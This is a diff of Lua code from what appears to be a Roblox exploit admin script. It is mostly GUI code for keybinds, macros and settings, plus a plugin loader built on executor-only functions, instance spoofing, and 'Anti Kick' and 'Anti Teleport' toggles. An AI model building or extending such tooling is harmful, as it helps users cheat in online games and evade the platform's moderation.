+                            CWait(UserInputService.InputEnded);
+                            if (Input2 and not Processed) then
+                                local KeyName, IsEnum = GetKeyName(Input.KeyCode);
+                                local KeyName2, IsEnum2 = GetKeyName(Input2.KeyCode); 
+                                BindA.Text = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
+                                Keybind[1] = Input.KeyCode
+                                Keybind[2] = Input2.KeyCode
+                            else
+                                local KeyName = GetKeyName(Input.KeyCode);
+                                BindA.Text = KeyName
+                                Keybind[1] = Input.KeyCode
+                                Keybind[2] = nil
+                            end
+                            LocalPlayer.DevEnableMouseLock = OldShiftLock
+                        else
+                            BindA.Text = "Bind"
+                        end
+                        Enabled = false
+                        Disconnect(Connection);
+                    end));
+                else
+                    BindA.Text = "Bind"
+                    Disconnect(Connection);
+                end
+            end
+
+            AddConnection(CConnect(BindA.MouseButton1Click, OnClick));
+            AddConnection(CConnect(Add.MouseButton1Click, function()
+                if (BindA.Text == "Bind") then
+                    Utils.Notify(nil, nil, "You must assign a keybind");
+                    return
+                end
+                if (not CommandsTable[CommandA.Text]) then
+                    Utils.Notify(nil, nil, "You must add a command");
+                    return
+                end
+                Callback(Keybind, CommandA.Text, ArgsA.Text);
+            end));
+
+            local Focused = false
+            local MacroSection = {
+                CommandsList = CommandsList,
+                AddCmd = function(Name) 
+                    local Command = Clone(Macro.Command);
+                    Command.Name = Name
+                    Command.Text = Name
+                    Command.Parent = CommandsList
+                    Command.Visible = true
+                    AddConnection(CConnect(Command.MouseButton1Click, function()
+                        CommandA.Text = Name
+                        ArgsA.CaptureFocus(ArgsA);
+                        Focused = true
+                        CWait(ArgsA.FocusLost);
+                        CWait(UserInputService.InputBegan);
+                        Focused = false
+                        wait(.2);
+                        if (not Focused) then
+                            OnClick();
+                        end
+                    end))
+                end,
+                AddMacro = function(MacroName, Bind)
+                    local NewMacro = Clone(Macro.EditMacro);
+                    NewMacro.Bind.Text = Bind
+                    NewMacro.Macro.Text = MacroName
+                    NewMacro.Parent = CurrentMacros
+                    NewMacro.Visible = true
+
+                    Utils.Thing(NewMacro.Bind);
+                    Utils.Thing(NewMacro.Macro);
+
+                    FindFirstChild(NewMacro, "Remove").Name = "Delete"
+                    AddConnection(CConnect(NewMacro.Delete.MouseButton1Click, function()
+                        CWait(Utils.TweenAllTrans(NewMacro, .25).Completed);
+                        Destroy(NewMacro);
+                        for i = 1, #Macros do
+                            if (Macros[i].Command == split(MacroName, " ")[1]) then
+                                Macros[i] = nil
+                            end
+                        end
+                        local TempMacros = clone(Macros);
+                        for i, v in next, TempMacros do
+                            for i2, v2 in next, v.Keys do
+                                TempMacros[i]["Keys"][i2] = split(tostring(v2), ".")[3]
+                            end
+                        end
+                        SetConfig({Macros=TempMacros});
+                    end))
+                end
+            }
+
+            for i, v in next, MacrosToAdd do
+                local Suc, Err = pcall(concat, v.Args, " ");
+                if (not Suc) then
+                    SetConfig({Macros={}});
+                    Utils.Notify(LocalPlayer, "Error", "Macros were reset due to corrupted data")
+                    break;
+                end
+                local KeyName, IsEnum = GetKeyName(v.Keys[1]);
+                local Formatted;
+                if (v.Keys[2]) then
+                    local KeyName2, IsEnum2 = GetKeyName(v.Keys[2]); 
+                    Formatted = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
+                else
+                    Formatted = KeyName
+                end
+                MacroSection.AddMacro(v.Command .. " " .. concat(v.Args, " "), Formatted);
+            end
+
+            return MacroSection
+        end
+
+        function PageLibrary.NewSection(Title)
+            local Section = Clone(GuiObjects.Section.Container);
+            local SectionOptions = Section.Options
+            local SectionUIListLayout = SectionOptions.UIListLayout
+
+            Section.Visible = true
+
+            Utils.SmoothScroll(Section.Options, .14)
+            Section.Title.Text = Title
+            Section.Parent = Page.Selection
+            
+            
+            SectionOptions.CanvasSize = UDim2.fromOffset(0,0) --// change
+            AddConnection(CConnect(GetPropertyChangedSignal(SectionUIListLayout, "AbsoluteContentSize"), function()
+                SectionOptions.CanvasSize = UDim2.fromOffset(0, SectionUIListLayout.AbsoluteContentSize.Y + 5);
+            end));
+            
+            UpdateClone();
+
+            local ElementLibrary = {}
+
+
+            function ElementLibrary.Toggle(Title, Enabled, Callback)
+                local Toggle = Clone(GuiObjects.Elements.Toggle);
+                local Container = Toggle.Container
+
+                local Switch = Container.Switch
+                local Hitbox = Container.Hitbox
+                
+                if not Enabled then
+                    Switch.Position = UDim2.fromOffset(2, 2)
+                    Container.BackgroundColor3 = Colors.ToggleDisabled
+                end
+                local NoCallback = false
+
+                local OnClick = function()
+                    Enabled = not Enabled
+                    
+                    Utils.Tween(Switch, "Quad", "Out", .25, {
+                        Position = Enabled and UDim2.new(1, -18, 0, 2) or UDim2.fromOffset(2, 2)
+                    })
+                    Utils.Tween(Container, "Quad", "Out", .25, {
+                        BackgroundColor3 = Enabled and Colors.ToggleEnabled or Colors.ToggleDisabled
+                    })
+                    
+                    if (not NoCallback) then
+                        Callback(Enabled);
+                    end
+                end
+
+                AddConnection(CConnect(Hitbox.MouseButton1Click, OnClick));
+                
+                Toggle.Visible = true
+                Toggle.Title.Text = Title
+                Toggle.Parent = Section.Options
+                Utils.Thing(Toggle.Title);
+
+                UpdateClone()
+
+                return function()
+                    NoCallback = true
+                    OnClick();
+                    NoCallback = false
+                end
+            end
+
+            function ElementLibrary.ScrollingFrame(Title, Callback, Elements, Toggles)
+                local ScrollingFrame = Clone(GuiObjects.Elements.ScrollingFrame);
+                local Frame = ScrollingFrame.Frame
+                local Toggle = ScrollingFrame.Toggle
+
+                for ElementTitle, Enabled in next, Elements do
+                    local NewToggle = Clone(Toggle);
+                    NewToggle.Visible = true
+                    NewToggle.Title.Text = ElementTitle
+                    NewToggle.Plugins.Text = Enabled and (Toggles and Toggles[1] or "Enabled") or (Toggles and Toggles[2] or "Disabled");
+
+
+                    Utils.Click(NewToggle.Plugins, "BackgroundColor3")
+
+                    AddConnection(CConnect(NewToggle.Plugins.MouseButton1Click, function()
+                        Enabled = not Enabled
+                        NewToggle.Plugins.Text = Enabled and (Toggles and Toggles[1] or "Enabled") or (Toggles and Toggles[2] or "Disabled");
+
+                        Callback(ElementTitle, Enabled);
+                    end));
+
+                    NewToggle.Parent = Frame.Container
+                end
+
+                Frame.Visible = true
+                Frame.Title.Text = Title
+                Frame.Parent = Section.Options
+
+                for _, NewToggle in next, GetChildren(Frame.Container) do
+                    if (IsA(NewToggle, "GuiObject")) then
+                        Utils.Thing(NewToggle.Title);
+                    end
+                end
+
+                UpdateClone()
+            end
+
+            function ElementLibrary.Keybind(Title, Bind, Callback)
+                local Keybind = Clone(GuiObjects.Elements.Keybind);
+                local Enabled = false
+                local Connection
+
+                Keybind.Container.Text = Bind
+                Keybind.Title.Text = Title
+
+                local Container = Keybind.Container
+                AddConnection(CConnect(Container.MouseButton1Click, function()
+                    Enabled = not Enabled
+
+                    if Enabled then
+                        Container.Text = "..."
+                        local OldShiftLock = LocalPlayer.DevEnableMouseLock
+                        -- disable shift lock so it doesn't interfere with keybind
+                        LocalPlayer.DevEnableMouseLock = false
+                        Connection = AddConnection(CConnect(UserInputService.InputBegan, function(Input, Processed)
+                            if not Processed and Input.UserInputType == Enum.UserInputType.Keyboard then
+                                local Input2, Proccessed2;
+                                CThread(function()
+                                    Input2, Proccessed2 = CWait(UserInputService.InputBegan);
+                                end)()
+                                CWait(UserInputService.InputEnded);
+                                if (Input2 and not Processed) then
+                                    local KeyName, IsEnum = GetKeyName(Input.KeyCode);
+                                    local KeyName2, IsEnum2 = GetKeyName(Input2.KeyCode); 
+                                    -- Order by if it's an enum first, example 'Shift + K' and not 'K + Shift'
+                                    Container.Text = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
+                                    Callback(Input.KeyCode, Input2.KeyCode);
+                                else
+                                    local KeyName = GetKeyName(Input.KeyCode);
+                                    Container.Text = KeyName
+                                    Callback(Input.KeyCode);
+                                end
+                                LocalPlayer.DevEnableMouseLock = OldShiftLock
+                            else
+                                Container.Text = "press"
+                            end
+                            Enabled = false
+                            Disconnect(Connection);
+                        end));
+                    else
+                        Container.Text = "press"
+                        Disconnect(Connection);
+                    end
+                end));
+
+                Utils.Click(Container, "BackgroundColor3");
+                Keybind.Visible = true
+                Keybind.Parent = Section.Options
+                UpdateClone();
+            end
+            
+            function ElementLibrary.TextboxKeybind(Title, Bind, Callback)
+                local Keybind = Clone(GuiObjects.Elements.TextboxKeybind);
+                
+                Keybind.Container.Text = Bind
+                Keybind.Title.Text = Title
+                
+                local Container = Keybind.Container
+                AddConnection(CConnect(GetPropertyChangedSignal(Container, "Text"), function(Key)
+                    if (#Container.Text >= 1) then
+                        Container.Text = sub(Container.Text, 1, 1);
+                        Callback(Container.Text);
+                        Container.ReleaseFocus(Container);
+                    end
+                end))
+                
+                Keybind.Visible = true
+                Keybind.Parent = Section.Options
+                UpdateClone();
+            end
+
+            function ElementLibrary.ColorPicker(Title, DefaultColor, Callback)
+                local SelectColor = Clone(ColorElements.SelectColor);
+                local CurrentColor = DefaultColor
+                local Button = SelectColor.Button
+                local ToHSV = DefaultColor.ToHSV
+                local Color3New = Color3.new
+                local Color3fromHSV = Color3.fromHSV
+                local UDim2New = UDim2.new
+                local clamp = math.clamp
+
+                local H, S, V = ToHSV(DefaultColor);
+                local Opened = false
+                local Rainbow = false
+                
+                local function UpdateText()
+                    RedTextBox.PlaceholderText = tostring(math.floor(CurrentColor.R * 255))
+                    GreenTextBox.PlaceholderText = tostring(math.floor(CurrentColor.G * 255))
+                    BlueTextBox.PlaceholderText = tostring(math.floor(CurrentColor.B * 255))
+                end
+                
+                local function UpdateColor()
+                    H, S, V = ToHSV(CurrentColor);
+                    
+                    SliderBar.Position = UDim2New(0, 0, H, 2);
+                    CanvasBar.Position = UDim2New(S, 2, 1 - V, 2);
+                    ColorGradient.UIGradient.Color = Utils.MakeGradient({
+                        [1] = Color3New(1, 1, 1);
+                        [2] = Color3fromHSV(H, 1, 1);
+                    })
+                    
+                    ColorPreview.BackgroundColor3 = CurrentColor
+                    UpdateText();
+                end
+            
+                local function UpdateHue(Hue)
+                    SliderBar.Position = UDim2New(0, 0, Hue, 2);
+                    ColorGradient.UIGradient.Color = Utils.MakeGradient({
+                        [1] = Color3New(1, 1, 1);
+                        [2] = Color3fromHSV(Hue, 1, 1);
+                    });
+                    
+                    ColorPreview.BackgroundColor3 = CurrentColor
+                    UpdateText();
+                end
+                
+                local function ColorSliderInit()
+                    local Moving = false
+                    
+                    local function Update()
+                        if Opened and not Rainbow then
+                            local LowerBound = SliderHitbox.AbsoluteSize.Y
+                            local Position = clamp(Mouse.Y - SliderHitbox.AbsolutePosition.Y, 0, LowerBound);
+                            local Value = Position / LowerBound
+                            
+                            H = Value
+                            CurrentColor = Color3fromHSV(H, S, V);
+                            ColorPreview.BackgroundColor3 = CurrentColor
+                            ColorGradient.UIGradient.Color = Utils.MakeGradient({
+                                [1] = Color3New(1, 1, 1);
+                                [2] = Color3fromHSV(H, 1, 1);
+                            });
+                            
+                            UpdateText();
+                            
+                            local Position = UDim2.new(0, 0, Value, 2)
+                            local Tween = Utils.Tween(SliderBar, "Linear", "Out", .05, {
+                                Position = Position
+                            });
+                            
+                            Callback(CurrentColor);
+                            CWait(Tween.Completed);
+                        end
+                    end
+                
+                    AddConnection(CConnect(SliderHitbox.MouseButton1Down, function()
+                        Moving = true
+                        Update()
+                    end))
+                    
+                    AddConnection(CConnect(UserInputService.InputEnded, function(Input)
+                        if Input.UserInputType == Enum.UserInputType.MouseButton1 and Moving then
+                            Moving = false
+                        end
+                    end))
+                    
+                    AddConnection(CConnect(Mouse.Move, Utils.Debounce(function()
+                        if Moving then
+                            Update()
+                        end
+                    end)))
+                end
+                local function ColorCanvasInit()
+                    local Moving = false
+                    
+                    local function Update()
+                        if Opened then
+                            local LowerBound = CanvasHitbox.AbsoluteSize.Y
+                            local YPosition = clamp(Mouse.Y - CanvasHitbox.AbsolutePosition.Y, 0, LowerBound)
+                            local YValue = YPosition / LowerBound
+                            local RightBound = CanvasHitbox.AbsoluteSize.X
+                            local XPosition = clamp(Mouse.X - CanvasHitbox.AbsolutePosition.X, 0, RightBound)
+                            local XValue = XPosition / RightBound
+                            
+                            S = XValue
+                            V = 1 - YValue
+                            
+                            CurrentColor = Color3fromHSV(H, S, V);
+                            ColorPreview.BackgroundColor3 = CurrentColor
+                            UpdateText()
+                            
+                            local Position = UDim2New(XValue, 2, YValue, 2);
+                            local Tween = Utils.Tween(CanvasBar, "Linear", "Out", .05, {
+                                Position = Position
+                            });
+                            Callback(CurrentColor);
+                            CWait(Tween.Completed);
+                        end
+                    end
+                
+                    AddConnection(CConnect(CanvasHitbox.MouseButton1Down, function()
+                        Moving = true
+                        Update()
+                    end))
+                    
+                    AddConnection(CConnect(UserInputService.InputEnded, function(Input)
+                        if Input.UserInputType == Enum.UserInputType.MouseButton1 and Moving then
+                            Moving = false
+                        end
+                    end))
+                    
+                    AddConnection(CConnect(Mouse.Move, Utils.Debounce(function()
+                        if Moving then
+                            Update()
+                        end
+                    end)))
+                end
+                
+                ColorSliderInit()
+                ColorCanvasInit()
+                
+                AddConnection(CConnect(Button.MouseButton1Click, function()
+                    if not Opened then
+                        Opened = true
+                        UpdateColor()
+                        RainbowToggle.Container.Switch.Position = Rainbow and UDim2New(1, -18, 0, 2) or UDim2.fromOffset(2, 2)
+                        RainbowToggle.Container.BackgroundColor3 = Color3.fromRGB(25, 25, 25);
+                        Overlay.Visible = true
+                        OverlayMain.Visible = false
+                        Utils.Intro(OverlayMain)
+                    end
+                end))
+                
+                AddConnection(CConnect(ClosePicker.MouseButton1Click, Utils.Debounce(function()
+                    Button.BackgroundColor3 = CurrentColor
+                    Utils.Intro(OverlayMain)
+                    Overlay.Visible = false
+                    Opened = false
+                end)))
+                
+                AddConnection(CConnect(RedTextBox.FocusLost, function()
+                    if Opened then
+                        local Number = tonumber(RedTextBox.Text)
+                        if Number then
+                            Number = clamp(floor(Number), 0, 255)
+                            CurrentColor = Color3New(Number / 255, CurrentColor.G, CurrentColor.B)
+                            UpdateColor()
+                            RedTextBox.PlaceholderText = tostring(Number)
+                            Callback(CurrentColor)
+                        end
+                        RedTextBox.Text = ""
+                    end
+                end))
+                
+                AddConnection(CConnect(GreenTextBox.FocusLost, function()
+                    if Opened then
+                        local Number = tonumber(GreenTextBox.Text)
+                        if Number then
+                            Number = clamp(floor(Number), 0, 255)
+                            CurrentColor = Color3New(CurrentColor.R, Number / 255, CurrentColor.B)
+                            UpdateColor()
+                            GreenTextBox.PlaceholderText = tostring(Number)
+                            Callback(CurrentColor)
+                        end
+                        GreenTextBox.Text = ""
+                    end
+                end))
+                
+                AddConnection(CConnect(BlueTextBox.FocusLost, function()
+                    if Opened then
+                        local Number = tonumber(BlueTextBox.Text)
+                        if Number then
+                            Number = clamp(floor(Number), 0, 255)
+                            CurrentColor = Color3New(CurrentColor.R, CurrentColor.G, Number / 255)
+                            UpdateColor()
+                            BlueTextBox.PlaceholderText = tostring(Number)
+                            Callback(CurrentColor)
+                        end
+                        BlueTextBox.Text = ""
+                    end
+                end))
+                
+                Utils.ToggleFunction(RainbowToggle.Container, false, function(Callback)
+                    if Opened then
+                        Rainbow = Callback
+                    end
+                end)
+                
+                AddConnection(CConnect(RenderStepped, function()
+                    if Rainbow then
+                        local Hue = (tick() / 5) % 1
+                        CurrentColor = Color3.fromHSV(Hue, S, V)
+                        
+                        if Opened then
+                            UpdateHue(Hue)
+                        end
+                        
+                        Button.BackgroundColor3 = CurrentColor
+                        Callback(CurrentColor, true);
+                    end
+                end))
+                                
+                Button.BackgroundColor3 = DefaultColor
+                SelectColor.Title.Text = Title
+                SelectColor.Visible = true
+                SelectColor.Parent = Section.Options
+                Utils.Thing(SelectColor.Title);
+            end
+
+            return ElementLibrary
+        end
+
+        return PageLibrary
+    end
+end
+
+Utils.Click(ConfigUI.Close, "TextColor3")
+AddConnection(CConnect(ConfigUI.Close.MouseButton1Click, function()
+    ConfigLoaded = false
+    CWait(Utils.TweenAllTrans(ConfigUI, .25).Completed);
+    ConfigUI.Visible = false
+end))
 --END IMPORT [uimore]
+
+
+--IMPORT [plugin]
+PluginConf = IsSupportedExploit and GetPluginConfig();
+local Plugins;
+
+PluginLibrary = {
+    LocalPlayer = LocalPlayer,
+    Services = Services,
+    GetCharacter = GetCharacter,
+    ProtectInstance = ProtectInstance,
+    SpoofInstance = SpoofInstance,
+    SpoofProperty = SpoofProperty,
+    UnSpoofInstance = UnSpoofInstance,
+    ReplaceCharacter = ReplaceCharacter,
+    ReplaceHumanoid = ReplaceHumanoid,
+    GetCorrectToolWithHandle = GetCorrectToolWithHandle,
+    DisableAnimate = DisableAnimate,
+    GetPlayer = GetPlayer,
+    GetHumanoid = GetHumanoid,
+    GetRoot = GetRoot,
+    GetMagnitude = GetMagnitude,
+    GetCommandEnv = function(Name)
+        local Command = LoadCommand(Name);
+        if (Command.CmdEnv) then
+            return Command.CmdEnv
+        end
+    end,
+    isR6 = isR6,
+    ExecuteCommand = ExecuteCommand,
+    Notify = Utils.Notify,
+    HasTool = HasTool,
+    isSat = isSat,
+    Request = syn and syn.request or request or game.HttpGet,
+    CThread = CThread,
+    AddConnection = AddConnection,
+    filter = filter,
+    map = map,
+    clone = clone,
+    firetouchinterest = firetouchinterest,
+    fireproximityprompt = fireproximityprompt,
+    decompile = decompile,
+    getnilinstances = getnilinstances,
+    getinstances = getinstances,
+    Drawing = Drawing
+}
+
+do
+    local IsDebug = IsSupportedExploit and PluginConf.PluginDebug
+
+    Plugins = IsSupportedExploit and map(filter(listfiles("krones-clientbridge-admin/plugins"), function(i, v)
+        return lower(split(v, ".")[#split(v, ".")]) == "lua"
+    end), function(i, v)
+        local splitted = split(v, "\\");
+        return {splitted[#splitted], loadfile(v)}
+    end) or {}
+
+    if (SafePlugins) then
+        local Renv = clone(getrenv(), true);
+        for i, v in next, Renv do
+            PluginLibrary[i] = v
+        end
+    end
+    PluginLibrary.debug = nil
+    PluginLibrary.getfenv = nil
+    PluginLibrary.loadstring = loadstring
+
+    if (PluginConf.SafePlugins) then
+        local Funcs = {}
+        for i, v in next, PluginLibrary do
+            if (type(v) == 'function') then
+                Funcs[#Funcs + 1] = v
+            end
+        end
+        local FateEnv = getfenv(1);
+        PluginLibrary.getfenv = newcclosure(function(...)
+            local f = ({...})[1]
+            local Env = getfenv(...);
+            if (type(f) == 'function' and Tfind(Funcs, f) or Env == FateEnv and checkcaller()) then
+                return PluginLibrary
+            end
+            return Env
+        end)
+    end
+
+    if (PluginConf.PluginsEnabled) then
+        local LoadPlugin = function(Plugin)
+            if (not IsSupportedExploit) then
+                return 
+            end
+        
+            if (Plugin and PluginConf.DisabledPlugins[Plugin.Name]) then
+                Utils.Notify(LocalPlayer, "Plugin not loaded.", format("Plugin %s was not loaded as it is on the disabled list.", Plugin.Name));
+                return "Disabled"
+            end
+            if (#keys(Plugin) < 3) then
+                return Utils.Notify(LocalPlayer, "Plugin Fail", "One of your plugins is missing information.");
+            end
+            if (IsDebug) then
+                Utils.Notify(LocalPlayer, "Plugin loading", format("Plugin %s is being loaded.", Plugin.Name));
+            end
+            
+            local Context;
+            local sett, gett = setthreadidentity, getthreadidentity
+            if (sett and PluginConf.SafePlugins) then
+                Context = gett();
+                sett(5);
+            end
+            local Ran, Return = pcall(Plugin.Init);
+            if (sett and Context) then
+                sett(Context);
+            end
+            if (not Ran and Return and IsDebug) then
+                return Utils.Notify(LocalPlayer, "Plugin Fail", format("there is an error in plugin Init %s: %s", Plugin.Name, Return));
+            end
+            
+            for i, command in next, Plugin.Commands or {} do -- adding the "or" because some people might have outdated plugins in the dir
+                if (#keys(command) < 3) then
+                    Utils.Notify(LocalPlayer, "Plugin Command Fail", format("Command %s is missing information", command.Name));
+                    continue
+                end
+                AddCommand(command.Name, command.Aliases or {}, command.Description .. " - " .. Plugin.Author, command.Requirements or {}, command.Func, true);
+        
+                if (FindFirstChild(Commands.Frame.List, command.Name)) then
+                    Destroy(FindFirstChild(Commands.Frame.List, command.Name));
+                end
+                local Clone = Clone(Command);
+                Utils.Hover(Clone, "BackgroundColor3");
+                Utils.ToolTip(Clone, format("%s\n%s - %s", command.Name, command.Description, Plugin.Author));
+                Clone.CommandText.RichText = true
+                Clone.CommandText.Text = format("%s %s %s", command.Name, next(command.Aliases or {}) and format("(%s)", concat(command.Aliases, ", ")) or "", Utils.TextFont("[PLUGIN]", {77, 255, 255}));
+                Clone.Name = command.Name
+                Clone.Visible = true
+                Clone.Parent = Commands.Frame.List
+                if (IsDebug) then
+                    Utils.Notify(LocalPlayer, "Plugin Command Loaded", format("Command %s loaded successfully", command.Name));
+                end
+            end
+        end
+        
+        if (IsSupportedExploit) then
+            if (not isfolder("krones-clientbridge-admin") and not isfolder("krones-clientbridge-admin/plugins") and not isfolder("krones-clientbridge-admin/plugin-conf.json") or not isfolder("krones-clientbridge-admin/chatlogs")) then
+                WriteConfig();
+            end
+        end
+
+        for i, Plugin in next, Plugins do
+            local PluginFunc = Plugin[2]
+            if (PluginConf.SafePlugins) then
+                setfenv(PluginFunc, PluginLibrary);
+            else
+                local CurrentEnv = getfenv(PluginFunc);
+                for i2, v2 in next, PluginLibrary do
+                    CurrentEnv[i2] = v2
+                end
+            end
+            local Success, Ret = pcall(PluginFunc);
+            if (Success) then
+                LoadPlugin(Ret);
+            elseif (PluginConf.PluginDebug) then
+                Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
+                warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
+            end
+        end
+        
+        AddCommand("refreshplugins", {"rfp", "refreshp", "reloadp"}, "Loads all new plugins.", {}, function()
+            if (not IsSupportedExploit) then
+                return "your exploit does not support plugins"
+            end
+            PluginConf = GetPluginConfig();
+            IsDebug = PluginConf.PluginDebug
+            
+            Plugins = map(filter(listfiles("krones-clientbridge-admin/plugins"), function(i, v)
+                return lower(split(v, ".")[#split(v, ".")]) == "lua"
+            end), function(i, v)
+                return {split(v, "\\")[2], loadfile(v)}
+            end)
+            
+            for i, Plugin in next, Plugins do
+                local PluginFunc = Plugin[2]
+                setfenv(PluginFunc, PluginLibrary);
+                local Success, Ret = pcall(PluginFunc);
+                if (Success) then
+                    LoadPlugin(Ret);
+                elseif (PluginConf.PluginDebug) then
+                    Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
+                    warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
+                end
+            end
+        end)
+    end
+end
+--END IMPORT [plugin]
+
+
 WideBar = false
 Draggable = false
+
+--IMPORT [config]
+do
+    local UserInputService = Services.UserInputService
+    local GetStringForKeyCode = UserInputService.GetStringForKeyCode
+    local function GetKeyName(KeyCode)
+        local _, Stringed = pcall(GetStringForKeyCode, UserInputService, KeyCode);
+        local IsEnum = Stringed == ""
+        return (not IsEnum and _) and Stringed or split(tostring(KeyCode), ".")[3], (IsEnum and not _);
+    end
+
+    local SortKeys = function(Key1, Key2)
+        local KeyName, IsEnum = GetKeyName(Key1);
+        if (Key2) then
+            local KeyName2, IsEnum2 = GetKeyName(Key2);
+            return format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
+        end
+        return KeyName
+    end
+
+    LoadConfig = function()
+        local Script = ConfigUILib.NewPage("Script");
+        local Settings = Script.NewSection("Settings");
+    
+        local CurrentConf = GetConfig();
+
+        Settings.TextboxKeybind("Chat Prefix", Prefix, function(Key)
+            if (not match(Key, "%A") or match(Key, "%d") or #Key > 1) then
+                Utils.Notify(nil, "Prefix", "Prefix must be a 1 character symbol.");
+                return
+            end
+            Prefix = Key
+            Utils.Notify(nil, "Prefix", "Prefix is now " .. Key);
+        end)
+    
+        Settings.Keybind("CMDBar Prefix", GetKeyName(CommandBarPrefix), function(KeyCode1, KeyCode2)
+            CommandBarPrefix = KeyCode1
+            Utils.Notify(nil, "Prefix", "CommandBar Prefix is now " .. GetKeyName(KeyCode1));
+        end)
+    
+        local ToggleSave;
+        ToggleSave = Settings.Toggle("Save Prefix's", false, function(Callback)
+            SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
+            wait(.5);
+            ToggleSave();
+            Utils.Notify(nil, "Prefix", "saved prefix's");
+        end)
+    
+        local Misc = Script.NewSection("Misc");
+
+        Misc.Toggle("Chat Prediction", CurrentConf.ChatPrediction or false, function(Callback)
+            local ChatBar = ToggleChatPrediction();
+            if (Callback) then
+                ChatBar.CaptureFocus(ChatBar);
+                wait();
+                ChatBar.Text = Prefix
+            end
+            SetConfig({ChatPrediction=Callback});
+            Utils.Notify(nil, nil, format("ChatPrediction %s", Callback and "enabled" or "disabled"));
+        end)
+
+        Misc.Toggle("Anti Kick", Hooks.AntiKick, function(Callback)
+            Hooks.AntiKick = Callback
+            Utils.Notify(nil, nil, format("AntiKick %s", Hooks.AntiKick and "enabled" or "disabled"));
+        end)
+
+        Misc.Toggle("Anti Teleport", Hooks.AntiTeleport, function(Callback)
+            Hooks.AntiTeleport = Callback
+            Utils.Notify(nil, nil, format("AntiTeleport %s", Hooks.AntiTeleport and "enabled" or "disabled"));
+        end)
+
+        Misc.Toggle("wide cmdbar", WideBar, function(Callback)
+            WideBar = Callback
+            if (not Draggable) then
+                Utils.Tween(CommandBar, "Quint", "Out", .5, {
+                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween -110
+                })
+            end
+            Utils.Tween(CommandBar, "Quint", "Out", .5, {
+                Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
+            })
+            SetConfig({WideBar=Callback});
+            Utils.Notify(nil, nil, format("widebar %s", WideBar and "enabled" or "disabled"));
+        end)
+
+        Misc.Toggle("draggable cmdbar", Draggable, function(Callback)
+            Draggable = Callback
+            CommandBarOpen = true
+            Utils.Tween(CommandBar, "Quint", "Out", .5, {
+                Position = UDim2.new(0, Mouse.X, 0, Mouse.Y + 36);
+            })
+            Utils.Draggable(CommandBar);
+            local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
+            local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone);
+            CommandBar.Input.Text = ""
+            if (not Callback) then
+                Utils.Tween(CommandBar, "Quint", "Out", .5, {
+                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween 5
+                })
+            end
+            Utils.Notify(nil, nil, format("draggable command bar %s", Draggable and "enabled" or "disabled"));
+        end)
+
+        Misc.Toggle("KillCam when killing", CurrentConf.KillCam, function(Callback)
+            SetConfig({KillCam=Callback});
+            _L.KillCam = Callback
+        end)
+
+        local OldFireTouchInterest = firetouchinterest
+        Misc.Toggle("cframe touchinterest", firetouchinterest == nil, function(Callback)
+            firetouchinterest = Callback and function(part1, part2, toggle)
+                if (part1 and part2) then
+                    if (toggle == 0) then
+                        touched[1] = part1.CFrame
+                        part1.CFrame = part2.CFrame
+                    else
+                        part1.CFrame = touched[1]
+                        touched[1] = nil
+                    end
+                end
+            end or OldFireTouchInterest
+        end)
+
+        local MacrosPage = ConfigUILib.NewPage("Macros");
+        local MacroSection;
+        MacroSection = MacrosPage.CreateMacroSection(Macros, function(Bind, Command, Args)
+            local AlreadyAdded = false
+            for i = 1, #Macros do
+                if (Macros[i].Command == Command) then
+                    AlreadyAdded = true
+                end
+            end
+            if (CommandsTable[Command] and not AlreadyAdded) then
+                MacroSection.AddMacro(Command .. " " .. Args, SortKeys(Bind[1], Bind[2]));
+                Args = split(Args, " ");
+                if (sub(Command, 1, 2) == "un" or CommandsTable["un" .. Command]) then
+                    local Shifted = {Command, unpack(Args)}
+                    Macros[#Macros + 1] = {
+                        Command = "toggle",
+                        Args = Shifted,
+                        Keys = Bind
+                    }
+                else
+                    Macros[#Macros + 1] = {
+                        Command = Command,
+                        Args = Args,
+                        Keys = Bind
+                    }
+                end
+                local TempMacros = clone(Macros);
+                for i, v in next, TempMacros do
+                    for i2, v2 in next, v.Keys do
+                        TempMacros[i]["Keys"][i2] = split(tostring(v2), ".")[3]
+                    end
+                end
+                SetConfig({Macros=TempMacros});
+            end
+        end)
+        local UIListLayout = MacroSection.CommandsList.UIListLayout
+        for i, v in next, CommandsTable do
+            if (not FindFirstChild(MacroSection.CommandsList, v.Name)) then
+                MacroSection.AddCmd(v.Name);
+            end
+        end
+        MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
+        local Search = FindFirstChild(MacroSection.CommandsList.Parent.Parent, "Search");
+
+        AddConnection(CConnect(GetPropertyChangedSignal(Search, "Text"), function()
+            local Text = Search.Text
+            for _, v in next, GetChildren(MacroSection.CommandsList) do
+                if (IsA(v, "TextButton")) then
+                    local Command = v.Text
+                    v.Visible = Sfind(lower(Command), Text, 1, true)
+                end
+            end
+            MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
+        end), Connections.UI, true);
+        
+        local PluginsPage = ConfigUILib.NewPage("Plugins");
+        
+        local CurrentPlugins = PluginsPage.NewSection("Current Plugins");
+        local PluginSettings = PluginsPage.NewSection("Plugin Settings");
+    
+        local CurrentPluginConf = GetPluginConfig();
+    
+        CurrentPlugins.ScrollingFrame("plugins", function(Option, Enabled)
+            CurrentPluginConf = GetPluginConfig();
+            for i = 1, #Plugins do
+                local Plugin = Plugins[i]
+                if (Plugin[1] == Option) then
+                    local DisabledPlugins = CurrentPluginConf.DisabledPlugins
+                    local PluginName = Plugin[2]().Name
+                    if (Enabled) then
+                        DisabledPlugins[PluginName] = nil
